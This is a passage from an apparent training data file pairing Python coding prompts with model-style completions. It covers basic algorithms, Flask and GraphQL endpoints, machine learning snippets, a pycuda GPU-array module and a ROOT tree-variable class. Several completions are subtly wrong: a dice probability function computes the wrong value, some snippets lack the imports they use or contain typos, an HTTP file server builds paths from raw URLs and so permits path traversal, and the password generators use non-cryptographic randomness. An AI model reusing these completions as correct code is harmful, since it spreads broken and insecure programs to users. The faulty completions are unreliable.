api(request): return HttpResponse('POST request received at /api/')"},{"prompt":"Write a python script that computes the sum of all the odd numbers between 1 and 1000.","completion":"\\"\\"\\" Write a python script that computes the sum of all the odd numbers between 1 and 1000. \\"\\"\\" #define a function to compute the sum of the odd numbers def sum_odd_numbers(n): result = 0 for i in range(1,n+1): #check if the current number is odd if i%2 != 0: result += i return result #test the function input_n = 1000 print(sum_odd_numbers(input_n))"},{"prompt":"mplement a Python program to calculate the area of a triangle given the length of three sides. 5, 6, 7","completion":"def triangle_area(a, b, c): # Semi-perimeter s = (a + b + c) / 2 # calculate the area area = (s*(s-a)*(s-b)*(s-c)) ** 0.5 return area # Driver code a = 5 b = 6 c = 7 print(\\"Area of the triangle is {:.2f}\\".format(triangle_area(a, b, c)))"},{"prompt":"Create an object from a class in Python. class Employee: def __init__ (self, name, age): self.name = name self.age = age","completion":"john = Employee(\\"John\\", 25)"},{"prompt":"Create a Python program to aggregate data from multiple sources and store the data in a MongoDB database. Not applicable","completion":"import requests import pymongo # Establish connection to MongoDB client = pymongo.MongoClient('mongodb://localhost:27017/') db = client['aggregated_data'] # Make a request to each API and aggregate the data data_points = [] for url in ['url_1', 'url_2', etc.]: req = requests.get(url) data_points.append(req.json()) # Store the data in the MongoDB database db.aggregated_data.insert_many(data_points)"},{"prompt":"Create a Python program to calculate the sum of two numbers, given their positions in a given list. [1, 4, 5, 8, 9], positions = 3, 5","completion":"def sum_positions(numbers, pos1, pos2): sum = numbers[pos1] + numbers[pos2] return sum numbers = [1, 4, 5, 8, 9] positions = (3, 5) print(sum_positions(numbers, positions[0], positions[1]))"},{"prompt":"Generate an algorithm in Python to measure the time taken by a function to execute.","completion":"import time def measure_time(): start_time = time.time() # run your code end_time = time.time() time_taken = end_time - start_time return time_taken time_taken = measure_time() print (\\"Time taken in seconds: \\",time_taken)"},{"prompt":"Write a code optimization code that reduces the number of lines of code in a given Python script. def count_words(string): counts = { } for w in string.split(): if w in counts: counts[w] += 1 else: counts[w] = 1 return cou","completion":"def count_words(string): counts = { } for w in string.split(): counts[w] = counts.get(w, 0) + 1 return counts"},{"prompt":"Create a Python program to multiply a matrix by its inverse. [[3, 4], [2, 16]]","completion":"import numpy as np def inverse_multiplication(matrix): inverseM = np.linalg.inv(matrix) result = np.matmul(matrix, inverseM) return result matrix = [[3, 4], [2, 16]] result = inverse_multiplication(matrix) print(result)"},{"prompt":"Create a Python program to handle incoming HTTP requests from web browsers and send appropriate responses. Not applicable","completion":"import http.server class MyHandler(http.server.BaseHTTPRequestHandler): def do_GET(self): # Build file path url_tokens = self.path.split(\\"/\\") file_path = \\".\\" for token in url_tokens: if token != '': file_path += \\"/\\"+token # Set content type self.send_response(200) if file_path.endswith(\\".html\\"): self.send_header(\\"Content-type\\", \\"text/html\\") elif file_path.endswith(\\".css\\"): self.send_header(\\"Content-type\\", \\"text/css\\") else: self.send_header(\\"Content-type\\", \\"text/plain\\") self.end_headers() # Read and send back file content f = open(file_path, \\"rb\\") content = f.read() self.wfile.write(content) f.close() # Run server PORT = 8080 server_address = (\\"\\", PORT) server = http.server.HTTPServer(server_address, MyHandler) server.serve_forever()"},{"prompt":"Develop a code in Python to simulate a lottery game.","completion":"import random def generate_lottery_numbers(): # Generate 6 unique random numbers between 1 and 49 lottery_nums = random.sample(range(1, 50), 6) return lottery_nums if __name__ == '__main__': print(\\"Lottery numbers:\\", generate_lottery_numbers())"},{"prompt":"Create a Python script to generate a random password of length 8 with combination of characters, numbers and symbols. Not applicable","completion":"import random import string # Generate a random string of 8 characters characters = string.ascii_letters + string.digits + string.punctuation random_str = ''.join(random.choice(characters) for i in range(8)) # Print the generated random string print(\\"Generated random string password is:\\", random_str)"},{"prompt":"Generate a random password of the given length in Python.","completion":"import random import string def generate_password(length): chars = string.ascii_letters + string.digits return ''.join(random.choice(chars) for _ in range(length)) random_password = generate_password(8) print(random_password)"},{"prompt":"Build a web spider in Python which can read and parse a given web page. Not applicable","completion":"import requests import re url = \\"https://www.example.com\\" r = requests.get(url) data = r.text # Find all the links on the page links = re.findall(r'<a class=\\"linkClass\\" href=\\"(.*?)\\">', data) # Print the links for link in links: full_url = url + link print(full_url)"},{"prompt":"Optimize the runtime of the following Python code to improve its performance. import random random_numbers = [random.randint(1, 1000) for _ in range(1000)] def check_if_exists(n): for i in range(len(random_numbers)): if random_numbers[i] == n: return True return False","completion":"import random random_numbers = set(random.randint(1, 1000) for _ in range(1000)) def check_if_exists(n): return n in random_numbers if __name__ == \\"__main__\\": print(check_if_exists(10))"},{"prompt":"Generate a Python program that implements linear search","completion":"def linear_search(mylist, x): for i in range(len(mylist)): if mylist[i] == x: return i return -1"},{"prompt":"Write a Python function that takes a list of words as input and capitalizes the first character of each element in the list. [apple, banana, strawberry]","completion":"def capitalize(words): return [word.capitalize() for word in words] input_words = [\\"apple\\", \\"banana\\", \\"strawberry\\"] capitalized_words = capitalize(input_words) print(capitalized_words)"},{"prompt":"Create a Flask API in Python that takes in text as input and prints out the lemmas of each word. Not applicable","completion":"from flask import Flask, request from nltk.stem import WordNetLemmatizer app = Flask(__name__) @app.route(\\"/lemmas\\", methods=['POST']) def lemmas(): text = request.form[\\"text\\"] lemmatizer = WordNetLemmatizer() words = text.split(\\" \\") lemmas = [lemmatizer.lemmatize(word) for word in words] return \\" \\".join(lemmas) app.run(debug=True)"},{"prompt":"Create a Python code to display the multiplication table for a number between Number: 4","completion":"for i in range(1, 11): print(\\"4 x\\", i, \\"=\\", 4*i)"},{"prompt":"Develop a sophisticated algorithm for timeseries forecasting in Python. This algorithm should take a timeseries data as an input and predict the trend of the timeseries with high accuracy. Not applicable","completion":"import numpy as np import pandas as pd class TimeseriesForecaster: def __init__(self, data): self.data = data # Perform time-series transformations def create_transformed_timeseries(self): #Create details and aggregated version of the timeseries detail_df, agg_df = self.transform_into_detail_and_aggregates() # Create transformed timeseries transformed_dt = self.transform_into_transformed_timeseries(detai_df, agg_df) return transformed_dt # Fit the time-series forecasting models def fit_model(self, transformed_dt, n_test): # Create train and test datasets train, test = self.create_train_test_data(transformed_dt, n_test) # Fit different models to the train dataset fitted_sarima_model = self.fit_sarima_model(train) fitted_gbm_model = self.fit_gbm_model(train) fitted_nn_model = self.fit_nn_model(train) # Return the fitted models return fitted_sarima_model, fitted_gbm_model, fitted_nn_model # Perform inference on the test data def inference(self, test, fitted_sarima_model, fitted_gbm_model, fitted_nn_model): # Perform inference with the fitted models sarima_predictions, gbm_predictions, nn_predictions = self.inference_with_fitted_models(fitted_sarima_model, fitted_gbm_model, fitted_nn_model, test) # Create a combined predictions array combined_predictions = self.create_combined_predictions(sarima_predictions, gbm_predictions, nn_predictions) # Return the combined predictions return combined_predictions"},{"prompt":"Create a Python program to generate random passwords of 8 alphanumeric characters.","completion":"import string import random def generate_password(): letters = string.ascii_letters + string.digits return ''.join(random.choice(letters) for i in range(8))"},{"prompt":"Generate a program in Python that takes a list of numbers as input and finds the closest pair in the list my_list = [12, 4, 6, 18, 2, 8]","completion":"def find_closest_pair(my_list): closest_pair = None smallest_diff = float('inf') for i in range(len(my_list)): for j in range(i+1, len(my_list)): diff = abs(my_list[i] - my_list[j]) if diff < smallest_diff: smallest_diff = diff closest_pair = (my_list[i], my_list[j]) return closest_pair closest_pair = find_closest_pair(my_list) print(closest_pair)"},{"prompt":"Design a function in Python to remove all occurrences of a given number from a given list. [1, 7, 3, 1, 4, 7, 9], 7","completion":"def remove_num(lst, num): return [n for n in lst if n != num] print(remove_num([1, 7, 3, 1, 4, 7, 9], 7)) # [1, 3, 1, 4, 9]"},{"prompt":"Create a Python script for predicting the stocks price of a company for the next 30 days using a machine learning algorithm.","completion":"import pandas as pd from sklearn.linear_model import LinearRegression from sklearn.ensemble import RandomForestRegressor # Read the data of company stocks price df = pd.read_csv(\\"company_stock_prices.csv\\") # Create the features X = df.drop([\\"Date\\", \\"Price\\"], axis=1).values # Create the labels y = df[\\"Price\\"].values # Split the dataset into training and test set X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) # Train the model model = RandomForestRegressor() model.fit(X_train, y_train) # Make prediction on the test set y_pred = model.predict(X_test) # Make prediction for next 30 days X_new = df.drop([\\"Date\\", \\"Price\\"], axis=1).tail(30).values y_pred_30days = model.predict(X_new)"},{"prompt":"Design a function in Python to compute the factorial of a given number.","completion":"def factorial(n): if n == 0: return 1 else: return n * factorial(n-1)"},{"prompt":"Generate a Python program to calculate the probability of choosing two cards, one red and one black, from a standard deck of 52 cards","completion":"def calculate_probability(num_cards, num_red, num_black): return (num_red/num_cards)*(num_black/(num_cards-1))"},{"prompt":"Write a Python program to access a value from a nested dictionary given its keys.","completion":"def nested_dict_value(dictionary, keys): for key in keys: if key in dictionary.keys(): dictionary = dictionary[key] else: return None return dictionary data = { \\"first\\" : { \\"second\\" : { \\"third\\" : 10 } } } result = nested_dict_value(data, [\\"first\\", \\"second\\", \\"third\\"]) print(result)"},{"prompt":"mprove this Python function to double the input array. def double_array(arr): return arr","completion":"def double_array(arr): return [element * 2 for element in arr]"},{"prompt":"Create a Python program to take an array of numbers and calculate the average. [1, 4, 5, 6, 7]","completion":"def average(nums): sum = 0 for n in nums: sum += n return sum / len(nums) nums = [1, 4, 5, 6, 7] print(average(nums))"},{"prompt":"Compute the Least Common Multiple of two numbers. a = 15 b = 10","completion":"# Python3 code to find LCM def compute_lcm(x, y): # choose the greater number if x > y: greater = x else: greater = y while(True): if((greater % x == 0) and (greater % y == 0)): lcm = greater break greater += 1 return lcm lcm = compute_lcm(15, 10) print(\\"The Least Common Multiple of 15 and 10 is: \\",lcm)"},{"prompt":"Create a function in Python that takes in a list of numbers and returns true if the list of numbers is strictly increasing; false otherwise. numbers = [3, 4, 5, 6, 7]","completion":"def is_strictly_increasing(numbers): for i in range(len(numbers) - 1): if numbers[i] >= numbers[i + 1]: return False return True numbers = [3, 4, 5, 6, 7] result = is_strictly_increasing(numbers) print(result) # returns True"},{"prompt":"Write a Python program to calculate the probability of two dice rolling the same number.","completion":"def two_dice_same(n_dice): total_prob = 0 for i in range(1, n_dice + 1): probability = (1/6)**i * (5/6)**(n_dice - i) total_prob += probability return total_prob result = two_dice_same(2) print(result)"},{"prompt":"Create a Python program to calculate the maximum number divisible from all of the elements in an array. arr = [120, 80, 45, 33]","completion":"def maxDivisible(arr): max_num = arr[0] # n is the size of array n = len(arr) for i in range(1, n): if (arr[i] > max_num): max_num = arr[i] div_num = 1 # effectivly checks every number up to maximum of array for i in range(2, max_num + 1): div_flag = True # checks if number divisible from all elements for j in range(n): if (arr[j] % i != 0): div_flag = False if (div_flag): div_num = i return div_num"},{"prompt":"Generate a Python method which will check whether an input number is even or odd. Not applicable","completion":"def is_even(num): \\"\\"\\" This function takes a number as input and checks whether it is even or odd. Parameters ---------- num : int The number to be checked. Returns ------- bool Returns True if the number is even, False otherwise. \\"\\"\\" if num % 2 == 0: return True else: return False"},{"prompt":"The given code provides functions to transfer data to and from a GPUArray instance, set values in a GPUArray by index, and set values in a GPUArray by index from indexed values in another GPUArray. Use these functions to efficiently manipulate data on a GPU.","completion":"#!/usr/bin/env python import numbers import numpy as np import pycuda.driver as drv import pycuda.elementwise as elementwise import pycuda.gpuarray as gpuarray from pycuda.tools import dtype_to_ctype # List of available numerical types provided by numpy: # XXX This try/except is an ugly hack to prevent the doc build on # ReadTheDocs from failing: try: num_types = [np.typeDict[t] for t in np.typecodes['AllInteger']+np.typecodes['AllFloat']] except TypeError: num_types = [] # Numbers of bytes occupied by each numerical type: num_nbytes = dict((np.dtype(t), t(1).nbytes) for t in num_types) def set_realloc(x_gpu, data): \\"\\"\\" Transfer data into a GPUArray instance. Copies the contents of a numpy array into a GPUArray instance. If the array has a different type or dimensions than the instance, the GPU memory used by the instance is reallocated and the instance updated appropriately. Parameters ---------- x_gpu : pycuda.gpuarray.GPUArray GPUArray instance to modify. data : numpy.ndarray Array of data to transfer to the GPU. Examples -------- >>> import pycuda.gpuarray as gpuarray >>> import pycuda.autoinit >>> import numpy as np >>> import misc >>> x = np.asarray(np.random.rand(5), np.float32) >>> x_gpu = gpuarray.to_gpu(x) >>> x = np.asarray(np.random.rand(10, 1), np.float64) >>> set_realloc(x_gpu, x) >>> np.allclose(x, x_gpu.get()) True \\"\\"\\" # Only reallocate if absolutely necessary: if x_gpu.shape != data.shape or x_gpu.size != data.size or x_gpu.strides != data.strides or x_gpu.dtype != data.dtype: # Free old memory: x_gpu.gpudata.free() # Allocate new memory: nbytes = num_nbytes[data.dtype] x_gpu.gpudata = drv.mem_alloc(nbytes*data.size) # Set array attributes: x_gpu.shape = data.shape x_gpu.size = data.size x_gpu.strides = data.strides x_gpu.dtype = data.dtype # Update the GPU memory: x_gpu.set(data) def bufint(a): \\"\\"\\" Return buffer interface to GPU array. Parameters ---------- a : pycuda.gpuarray.GPUArray GPU array. Returns ------- b : buffer Buffer interface to array. Returns None if \`a\` has a length of 0. \\"\\"\\" assert isinstance(a, gpuarray.GPUArray) if a.size: return a.gpudata.as_buffer(a.nbytes) else: return None def set_by_inds(dest_gpu, ind, src_gpu, ind_which='dest'): \\"\\"\\" Set values in a GPUArray by index. Parameters ---------- dest_gpu : pycuda.gpuarray.GPUArray GPUArray instance to modify. ind : pycuda.gpuarray.GPUArray or numpy.ndarray 1D array of element indices to set. Must have an integer dtype. src_gpu : pycuda.gpuarray.GPUArray GPUArray instance from which to set values. ind_which : str If set to 'dest', set the elements in \`dest_gpu\` with indices \`ind\` to the successive values in \`src_gpu\`; the lengths of \`ind\` and \`src_gpu\` must be equal. If set to 'src', set the successive values in \`dest_gpu\` to the values in \`src_gpu\` with indices \`ind\`; the lengths of \`ind\` and \`dest_gpu\` must be equal. Examples -------- >>> import pycuda.gpuarray as gpuarray >>> import pycuda.autoinit >>> import numpy as np >>> import misc >>> dest_gpu = gpuarray.to_gpu(np.arange(5, dtype=np.float32)) >>> ind = gpuarray.to_gpu(np.array([0, 2, 4])) >>> src_gpu = gpuarray.to_gpu(np.array([1, 1, 1], dtype=np.float32)) >>> misc.set_by_inds(dest_gpu, ind, src_gpu, 'dest') >>> np.allclose(dest_gpu.get(), np.array([1, 1, 1, 3, 1], dtype=np.float32)) True >>> dest_gpu = gpuarray.to_gpu(np.zeros(3, dtype=np.float32)) >>> ind = gpuarray.to_gpu(np.array([0, 2, 4])) >>> src_gpu = gpuarray.to_gpu(np.arange(5, dtype=np.float32)) >>> misc.set_by_inds(dest_gpu, ind, src_gpu) >>> np.allclose(dest_gpu.get(), np.array([0, 2, 4], dtype=np.float32)) True Notes ----- Only supports 1D index arrays. May not be efficient for certain index patterns because of lack of inability to coalesce memory operations. \\"\\"\\" # Only support 1D index arrays: assert len(np.shape(ind)) == 1 assert dest_gpu.dtype == src_gpu.dtype assert issubclass(ind.dtype.type, numbers.Integral) N = len(ind) # Manually handle empty index array because it will cause the kernel to # fail if processed: if N == 0: return if ind_which == 'dest': assert N == len(src_gpu) elif ind_which == 'src': assert N == len(dest_gpu) else: raise ValueError('invalid value for \`ind_which\`') if not isinstance(ind, gpuarray.GPUArray): ind = gpuarray.to_gpu(ind) try: func = set_by_inds.cache[(dest_gpu.dtype, ind.dtype, ind_which)] except KeyError: data_ctype = dtype_to_ctype(dest_gpu.dtype) ind_ctype = dtype_to_ctype(ind.dtype) v = \\"{data_ctype} *dest, {ind_ctype} *ind, {data_ctype} *src\\".format(data_ctype=data_ctype, ind_ctype=ind_ctype) if ind_which == 'dest': func = elementwise.ElementwiseKernel(v, \\"dest[ind[i]] = src[i]\\") else: func = elementwise.ElementwiseKernel(v, \\"dest[i] = src[ind[i]]\\") set_by_inds.cache[(dest_gpu.dtype, ind.dtype, ind_which)] = func func(dest_gpu, ind, src_gpu, range=slice(0, N, 1)) set_by_inds.cache = {} def set_by_inds_from_inds(dest_gpu, ind_dest, src_gpu, ind_src): \\"\\"\\" Set values in a GPUArray by index from indexed values in another GPUArray. Parameters ---------- dest_gpu : pycuda.gpuarray.GPUArray GPUArray instance to modify. ind_dest : pycuda.gpuarray.GPUArray or numpy.ndarray 1D array of element indices in \`dest_gpu\` to set. Must have an integer dtype. src_gpu : pycuda.gpuarray.GPUArray GPUArray instance from which to set values. ind_src : pycuda.gpuarray.GPUArray or numpy.ndarray 1D array of element indices in \`src_gpu\` to copy. Must have an integer dtype. \\"\\"\\" assert len(np.shape(ind_dest)) == 1 assert len(np.shape(ind_src)) == 1 assert dest_gpu.dtype == src_gpu.dtype assert ind_dest.dtype == ind_src.dtype assert issubclass(ind_dest.dtype.type, numbers.Integral) assert issubclass(ind_src.dtype.type, numbers.Integral) N = len(ind_src) # Manually handle empty index array because it will cause the kernel to # fail if processed: if N == 0: return assert N == len(ind_dest) if not isinstance(ind_dest, gpuarray.GPUArray): ind_dest = gpuarray.to_gpu(ind_dest) if not isinstance(ind_src, gpuarray.GPUArray): ind_src = gpuarray.to_gpu(ind_src) try: func = set_by_inds_from_inds.cache[(dest_gpu.dtype, ind_dest.dtype)] except KeyError: data_ctype = dtype_to_ctype(dest_gpu.dtype) ind_ctype = dtype_to_ctype(ind_dest.dtype) v = \\"{data_ctype} *dest, {ind_ctype} *ind_dest,\\" \\"{data_ctype} *src, {ind_ctype} *ind_src\\".format(data_ctype=data_ctype, ind_ctype=ind_ctype) func = elementwise.ElementwiseKernel(v, \\"dest[ind_dest[i]] = src[ind_src[i]]\\") set_by_inds_from_inds.cache[(dest_gpu.dtype, ind_dest.dtype)] = func func(dest_gpu, ind_dest, src_gpu, ind_src, range=slice(0, N, 1)) set_by_inds_from_inds.cache = {}"},{"prompt":"Write a Python function to calculate the mean absolute error between two datasets.","completion":"def mean_absolute_error(y_true, y_pred): return np.mean(np.abs(y_true - y_pred))"},{"prompt":"Create a program that will parse the following XML into a Python dictionary. <person age=18> <name> <first>John</first> <last>Doe</last> </name> </person>","completion":"import xml.etree.ElementTree as ET def parseXML(xml_file): root = ET.parse(xml_file).getroot() person = dict() person['age'] = root.attrib.get('age') name = dict() name['first'] = root[0][0].text name['last'] = root[0][1].text person['name'] = name return person"},{"prompt":"Create a function in Python that takes a list of strings and for each string appends the first letter to the end of the string. ['cat', 'bird', 'rabbit']","completion":"def append_first_letter_end(list_of_strings): new_list_of_strings = [] for string in list_of_strings: new_string = string + string[0] new_list_of_strings.append(new_string) return new_list_of_strings"},{"prompt":"Write a function in Python that returns the nth term in a Fibonacci sequence.","completion":"# Fibonacci sequence generator def fibonacci(n): a = 0 b = 1 if n < 0: print(\\"Incorrect input\\") elif n == 1: return a elif n == 2: return b else: for i in range(2,n): c = a + b a = b b = c return b"},{"prompt":"Round an input float to two decimal places in Python. 8.374","completion":"num = 8.374 rounded_num = round(num, 2) print(rounded_num)"},{"prompt":"Create a machine learning algorithm in Python which takes in a dataset and creates a classifier to predict the label Not applicable","completion":"# Import necessary packages from sklearn.svm import SVC from sklearn.model_selection import train_test_split # Split the data into training and testing sets X_train, X_test, y_train, y_test = train_test_split(X, y) # Create and train the Support Vector Machine (SVM) model model = SVC() model.fit(X_train, y_train) # Accuracy of the model acc = model.score(X_test, y_test) # Predict labels for new data predictions = model.predict(X_test)"},{"prompt":"Could you please craft a Python solution to find the total number of days between two dates? date1 = 29 June 1999 date2 = 29 July 1999","completion":"import datetime def diff_in_days(date1, date2): d1 = datetime.datetime.strptime(date1, \\"%d %B %Y\\") d2 = datetime.datetime.strptime(date2, \\"%d %B %Y\\") delta = d2 - d1 return delta.days date1 = \\"29 June 1999\\" date2 = \\"29 July 1999\\" difference = diff_in_days(date1, date2) print(\\"Difference is\\", difference, \\"days\\")"},{"prompt":"Create a machine learning model in Python to predict the age of a person from their height and weight. Sample input: Height: 59 Weight: 140","completion":"import numpy as np from sklearn.linear_model import LinearRegression # Creating the X and Y datasets x = [] y = [] # Adding the data x.append([59, 140]) y.append(30) x = np.array(x) y = np.array(y) # Creating and fitting the model model = LinearRegression().fit(x, y)"},{"prompt":"Generate a Python 3 program that creates a list of 10 random numbers between 0 and 100.","completion":"import random # Create a list of 10 random numbers between 0 and 100 random_list = [] for i in range(10): random_list.append(random.randint(0,100)) # Print the list print(random_list)"},{"prompt":"Generate a GraphQL API in Python to create and read Books. Books should have a title and an author Not applicable","completion":"import asyncio import graphene from graphene import ObjectType, InputObjectType, String from graphene_sqlalchemy import SQLAlchemyObjectType from models import Book # Declare a Book data type class BookObject(SQLAlchemyObjectType): class Meta: model = Book # Define a Book Create Input type class BookCreateInput(InputObjectType): title = String(required=True) author = String(required=True) # Create Book mutation class CreateBook(graphene.Mutation): class Arguments: book_data = BookCreateInput(required=True) book = graphene.Field(BookObject) async def mutate(cls, info, book_data): loop = asyncio.get_running_loop() session = info.context['session'] async with session.begin_nested(): book = await loop.run_in_executor(None, lambda: Book(**book_data)) session.add(book) await session.commit() return CreateBook(book=book) # Queries class Query(ObjectType): book = graphene.Field(BookObject, title=String(required=True)) def resolve_book(self, info, title): return Book.query.filter_by(title=title).first() # Mutations class Mutation(ObjectType): create_book = CreateBook.Field() schema = graphene.Schema(query=Query, mutation=Mutation)"},{"prompt":"Create a Python script that splits a given string into equal parts","completion":"def split_str(str, n): return [str[i:i+n] for i in range(0, len(str), n)]"},{"prompt":"Generate Python code for a simple quiz application that displays a multiplechoice question and allows the user to select one of the choices as an answer. Q: What is the capital of France? A: Paris, Marseille, Lyo","completion":"quiz_questions = { 'What is the capital of France?': 'Paris', } def quiz(): print('Welcome to the quiz!') for question in quiz_questions: choices = quiz_questions[question].split(', ') print(question + 'n') for idx, choice in enumerate(choices): print(f'{idx+1}) {choice}') user_answer = input('nEnter the number of the correct answer: ') if choices[int(user_answer)-1] == quiz_questions[question]: print('Correct!') else: print('Incorrect!') quiz()"},{"prompt":"mplement an algorithm to find the second smallest element in an array of integers using Python. arr = [1, 5, 3, 0, 1]","completion":"def secondSmallest(arr): m1, m2 = float('inf'), float('inf') for x in arr: if x <= m1: m1, m2 = x, m1 elif x < m2: m2 = x return m2 arr = [1, 5, 3, 0, -1] print(secondSmallest(arr)) # Outputs 0"},{"prompt":"mplement a simple python program to split a string on a punctuation symbol. 'Hello,World!'","completion":"def split_on_punctuation(s): #Using re module import re out = re.split('[,]',s) return out print(split_on_punctuation('Hello,World!'))"},{"prompt":"Given a list of squares in a 2D array, generate a Python program to find the number of squares with a side greater than 5. [[2, 6, 1], [4, 3, 9], [4, 6, 7]]","completion":"count = 0 for row in arr: for col in row: if col > 5: count += 1 print(count)"},{"prompt":"Write a Python program to generate a Python Class using the given description. description = This class should store the name, age, and height of a person.","completion":"class Person: def __init__(self, name, age, height): self.name = name self.age = age self.height = height def get_name(self): return self.name def get_age(self): return self.age def get_height(self): return self.height"},{"prompt":"Compose a python program to classify each items in our list. List items: shirt, pants, dress, co","completion":"def classify(items): categories = ['shirts', 'pants', 'dresses', 'coats'] results = {} for item in items: for category in categories: if item == category: results[item] = category return results"},{"prompt":"Rewrite the given Python script to remove all punctuation from a given string. This is a sample string with punctuation marks .","completion":"def remove_punctuation(string): new_string = \\"\\" for char in string: if char not in \\",.?!;:\\": new_string += char return new_string"},{"prompt":"Write a Python program to convert a given binary form to its original string. b_string = 0100100001100101011011000110110001101111","completion":"def binary_to_string(b_string): s = \\"\\" for i in range(0, len(b_string), 8): byte = b_string[i: i + 8] s += chr(int(byte, 2)) return s b_string = \\"0100100001100101011011000110110001101111\\" print(binary_to_string(b_string)) # Output: Hello"},{"prompt":"Rewrite the following piece of code in Python, that calculates the sum of two variables. int x = 2; int y = 4; int sum = x + y;","completion":"x = 2 y = 4 sum = x + y print(sum) # 6"},{"prompt":"Write a script in Python to sort a list of words alphabetically. [python, java, c, sql, ruby]","completion":"def sort_words(words): ''' Function to sort a list of words alphabetically Parameters words: list of strings Returns sorted list of strings ''' sorted_list = sorted(words) return sorted_list"},{"prompt":"Enhance the following python function to rank elements of the given list in descending order. def my_sort(items): items.sort()","completion":"def my_sort(items): items.sort(reverse=True)"},{"prompt":"Develop a function in Python that takes an individual name as an input and output its acronym. Oscar Thomas","completion":"def make_acronym(name): acronym = \\"\\".join([word[0] for word in name.split()]).upper() return acronym result = make_acronym(\\"Oscar Thomas\\") print(result)"},{"prompt":"Create a Python program to remove all the duplicates from a given list. [1, 4, 2, 5, 6, 4, 1, 5]","completion":"def remove_duplicates(lst): non_duplicate_lst = [] for i in lst: if i not in non_duplicate_lst: non_duplicate_lst.append(i) return non_duplicate_lst lst = [1, 4, 2, 5, 6, 4, 1, 5] print(remove_duplicates(lst))"},{"prompt":"Using a Python dictionary, create a function that counts the occurrence of each word in a given string. string = This is a sample sentence to count the occurrence of each word.","completion":"def count_words(string): #split the string into individual words words = string.split() #create an empty dictionary to store the word counts word_counts = {} #loop through each word in the list for word in words: #if the word is not in the dictionary, add it with a count of 1 if word not in word_counts: word_counts[word] = 1 #otherwise increment the count for that word else: word_counts[word] += 1 #return the dictionary of word counts return word_counts"},{"prompt":"Create a program in Python to calculate the sum of the first n positive integers, using recursion. n = 5","completion":"def calculateSum(n): if n <= 0: return 0 else: return n + calculateSum(n-1) result = calculateSum(5) print(result)"},{"prompt":"Create a Python program to classify emails as 'spam' or 'not spam' using a machine learning model.","completion":"import pandas as pd from sklearn.model_selection import train_test_split from sklearn.naive_bayes import GaussianNB, MultinomialNB # Load data data = pd.read_csv('email.csv') # Separate features and labels X = data.drop('spam', axis=1).values y = data['spam'].values # Split data into train and test sets X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) # Create and fit the model model = MultinomialNB() model.fit(X_train, y_train) # Make predictions y_pred = model.predict(X_test) # Evaluate accuracy accuracy = metrics.accuracy_score(y_test, y_pred) print(f'Accuracy: {accuracy*100:.2f}%')"},{"prompt":"Construct a web scraper in Python using the Scrapy library which fetches information from a web page. Not applicable","completion":"import scrapy class MySpider(scrapy.Spider): name = 'myspider' start_urls = [ 'https://example.com/page1', 'https://example.com/page2', ] def parse(self, response): for item in response.css('item'): yield { 'title': item.css('item-title::text').get(), 'description': item.css('item-description::text').get(), }"},{"prompt":"Generate a code to implement the quicksort algorithm in Python","completion":"\\"\\"\\" Implement quicksort algorithm \\"\\"\\" def partition(arr,low,high): i = ( low-1 ) pivot = arr[high] for j in range(low , high): if arr[j] <= pivot: i = i+1 arr[i],arr[j] = arr[j],arr[i] arr[i+1],arr[high] = arr[high],arr[i+1] return ( i+1 ) def quick_sort(arr,low,high): if low < high: pi = partition(arr,low,high) quick_sort(arr, low, pi-1) quick_sort(arr, pi+1, high) if __name__ == '__main__': arr = [9,4,2,7,3,8,5,6] n = len(arr) quick_sort(arr,0,n-1) print(\\"The sorted array is:\\") for i in arr: print (i),"},{"prompt":"Compute the best single stock portfolio for a given dataset with Python.","completion":"import pandas as pd from scipy.optimize import minimize # read in data df = pd.read_csv('data.csv') # objective function def obj_func(weights, mean_returns, covariance_matrix): # compute portfolio mean return portfolio_mean_return = np.dot(mean_returns, weights) # compute portfolio variance portfolio_variance = np.sqrt(np.dot(weights.T, np.dot(covariance_matrix, weights))) # return the negative of the Sharpe ratio return -(portfolio_mean_return / portfolio_variance) # minimize function def minimize_func(mean_returns, covariance_matrix): # define initial weights init_weights = np.array([1/len(mean_returns)] * len(mean_returns)) # define constraints constraints = ({'type': 'eq', 'fun': lambda x: np.sum(x) - 1}, {'type': 'ineq', 'fun': lambda x: x}) # minimize the objective function results = minimize(obj_func, init_weights, args=(mean_returns, covariance_matrix), method='SLSQP', constraints=constraints) return results.x # optimize and get optimal weights weights = minimize_func(df.mean(), df.cov()) print(weights)"},{"prompt":"Construct a function in Python that takes two integers, a and b, and returns their sum.","completion":"def add_integers(a, b): return a + b"},{"prompt":"The given code is a Python script that defines a class called ManyJetsHiggsVarFiller which adds new variables to a ROOT tree. To use this class, you need to import it from the tree.gardening module and create an instance of it. Then, you can call the process method of the instance, passing the input and output ROOT files as arguments. The new variables that will be added to the output tree are: m4j, m3j, mW1jj, mW2jj, pt4j, pt3j, eta4j, eta3j, phi4j, phi3j, dphill4j, dphill3j, best1, and best2.","completion":"from tree.gardening import TreeCloner import optparse import sys import ROOT import numpy import re import os.path import math from math import * from array import array; # # # | | | | | _) # |/ | _\` | __ | | | _ __| | | | _\` | _\` | __| # | | ( | | | | | | __/ | ___ | | ( | ( | __ # _| _| __,_| _| _| __, | ___/ ___| __| _| _| _| __, | __, | ____/ # ____/ |___/ |___/ # # # # Examples: # # cd /HWWAnalysis/ShapeAnalysis # source test/env.sh # # gardener.py manyJetHiggsVar /data2/amassiro/VBF/Data/All21Aug2012_temp_1/latino_2000_ggToH1000toWWTo2LAndTau2Nu.root /data2/amassiro/VBF/Data/All21Aug2012_temp_2/latino_2000_ggToH1000toWWTo2LAndTau2Nu_TESTISITWORKING.root # # class ManyJetsHiggsVarFiller(TreeCloner): def __init__(self): pass def help(self): return '''Add new many jets system - Higgs variables''' def addOptions(self,parser): #description = self.help() #group = optparse.OptionGroup(parser,self.label, description) #group.add_option('-b', '--branch', dest='branch', help='Name of something that is not used ... ', default='boh') #parser.add_option_group(group) #return group pass def checkOptions(self,opts): pass @staticmethod def _deltamassw( jets ): mW = 80.385 return math.fabs( mW - (jets[0] + jets[1]).M() ) def process(self,**kwargs): tree = kwargs['tree'] input = kwargs['input'] output = kwargs['output'] self.connect(tree,input) newbranches = ['m4j', 'm3j', 'mW1jj', 'mW2jj', 'pt4j', 'pt3j', 'eta4j', 'eta3j', 'phi4j', 'phi3j', 'dphill4j', 'dphill3j', 'best1', 'best2'] self.clone(output,newbranches) m4j = numpy.ones(1, dtype=numpy.float32) m3j = numpy.ones(1, dtype=numpy.float32) mW1jj = numpy.ones(1, dtype=numpy.float32) mW2jj = numpy.ones(1, dtype=numpy.float32) pt4j = numpy.ones(1, 